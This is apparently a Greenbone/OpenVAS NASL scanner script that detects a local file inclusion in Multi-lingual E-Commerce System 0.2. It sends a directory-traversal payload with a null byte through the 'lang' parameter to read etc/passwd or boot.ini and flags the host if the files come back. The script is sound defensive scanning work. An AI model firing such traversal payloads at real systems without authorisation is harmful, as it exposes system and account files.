if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801285" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-09-21 16:43:08 +0200 (Tue, 21 Sep 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Multi-lingual E-Commerce System Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/8480/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/502798" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary PHP code in the context of the webserver process." );
	script_tag( name: "affected", value: "Multi-lingual E-Commerce System Version 0.2" );
	script_tag( name: "insight", value: "- Local file inclusion vulnerability due to improper validation
  of user supplied input to the 'lang' parameter in index.php.

  - Information Disclosure vulnerability due to reserved information in database.inc.

  - Arbitrary File Upload vulnerability due to improper validation of files
  uploaded via product_image.php." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Multi-lingual E-Commerce System and is prone
  to multiple Vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/shop", "/genericshop", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(( ContainsString( res, "<title>Multi-lingual Shop</title>" ) )){
		for file in make_list( "etc/passwd",
			 "boot.ini" ) {
			if(http_vuln_check( port: port, url: NASLString( dir, "/index.php?lang=../../" + "../../../../../../../../", file, "%00" ), pattern: "(root:.*:0:[01]:|\\[boot loader\\])" )){
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

